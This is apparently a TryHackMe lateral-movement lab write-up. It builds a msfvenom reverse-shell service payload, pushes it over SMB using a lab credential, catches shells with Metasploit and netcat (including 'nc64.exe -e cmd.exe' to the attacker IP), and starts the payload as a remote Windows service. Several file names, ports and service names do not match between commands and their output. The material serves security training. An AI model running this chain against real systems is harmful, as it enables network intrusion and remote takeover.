# Room Information

# Room Tasks

## Spawning Processes Remotely

```Bash
root@ip-10-10-43-174:~# systemd-resolve --interface lateralmovement --set-dns 10.200.122.101 --set-domain za.tryhackme.com
```
```Bash
root@ip-10-10-43-174:~# nslookup thmdc.za.tryhackme.com
Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
Name:	thmdc.za.tryhackme.com
Address: 10.200.122.101
```

```Bash
root@ip-10-10-43-174:~# firefox "http://distributor.za.tryhackme.com/creds"
```

![]()

![]()

```Bash
root@ip-10-10-43-174:~# msfvenom -p windows/shell/reverse_tcp exe-service LHOST=10.50.119.66 LPORT=1234 -o Payload.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Saved as: Payload1234.exe
```

```Bash
root@ip-10-10-43-174:~# smbclient -c 'put Payload1234.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
WARNING: The "syslog" option is deprecated
putting file Payload.exe as \Payload1234.exe (115.2 kb/s) (average 115.2 kb/s)
```

```Bash
root@ip-10-10-43-174:~# msfconsole -q
```
```Bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
```
```Bash
msf6 exploit(multi/handler) > set LHOST lateralmovement
LHOST => lateralmovement
```
```Bash
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
```
```Bash
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
```
```Bash
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.50.119.66:1234 
```

or

```Bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 9999;exploit"
```

```Bash
root@ip-10-10-43-174:~# ssh jenna.field@THMJMP2
jenna.field@thmjmp2's password: 

Microsoft Windows [Version 10.0.14393]                                       
(c) 2016 Microsoft Corporation. All rights reserved.                         

za\jenna.field@THMJMP2 C:\Users\jenna.field>
```

```Bash
root@ip-10-10-43-174:~# nc -lvnp 9998
Listening on [0.0.0.0] (family 0, port 9998)
```


```shell-session
za\jenna.field@THMJMP2 C:\Users\jenna.field>runas /netonly /user:ZA.TRYHACKME
.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.119.66 9998"     
Enter the password for ZA.TRYHACKME.COM\t1_leonard.summers:                  
Attempting to start c:\tools\nc64.exe -e cmd.exe 10.10.43.174 9998 as user "Z
A.TRYHACKME.COM\t1_leonard.summers" ...
```

```Bash
Listening on [0.0.0.0] (family 0, port 9998)
Connection from 10.200.122.249 58175 received!
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

```shell-session
C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com create THMservice-Paylaod1234 binPath= "%windir%\Payload1234.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com create THMservice-Paylaod1234 binPath= "%windir%\Paylaod1234.exe" start= auto
[SC] CreateService SUCCESS
```

```shell-session
C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com start THMservice-Paylaod1234
sc.exe \\thmiis.za.tryhackme.com start THMservice-9999

SERVICE_NAME: THMservice-9999 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4596
        FLAGS              : 

```

## Moving Laterally Using WMI

## Use of Alternate Authentication Material

## Abusing User Behavior

## Port Forwarding
